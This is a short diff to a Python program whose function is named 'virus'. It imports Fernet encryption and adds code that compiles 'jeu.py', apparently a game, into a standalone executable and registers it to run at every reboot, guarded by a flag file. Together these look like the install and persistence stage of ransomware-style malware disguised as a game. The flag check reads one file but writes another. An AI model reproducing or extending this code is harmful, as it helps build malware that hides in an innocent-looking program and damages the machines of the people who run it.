@@ -2,16 +2,29 @@ import os
 import random
 import pathlib
 import time
+import reboot
 from cryptography.fernet import Fernet
 import colorama
 from colorama import Fore, Back, Style
+
 colorama.init()
   
 ############################################################################################################################################################
 def virus():
-	print("installation")
-	os.system("pip install -U pyinstaller")
-	os.system("python3 -m PyInstaller --onefile jeu.py")
+	
+	file = open("files/file2", "r")
+	if file.readline()=="False":
+		file.close()
+		print("installation")
+		os.system("pip install -U pyinstaller")
+		os.system("python3 -m PyInstaller --onefile jeu.py")
+		reboot.add_to_reboot()
+		file = open("files/file", "w")
+		file.write("True")
+		file.close()
+	else:
+		file.close()
+
 	directory = os.getcwd()
 	time.sleep(1)
 
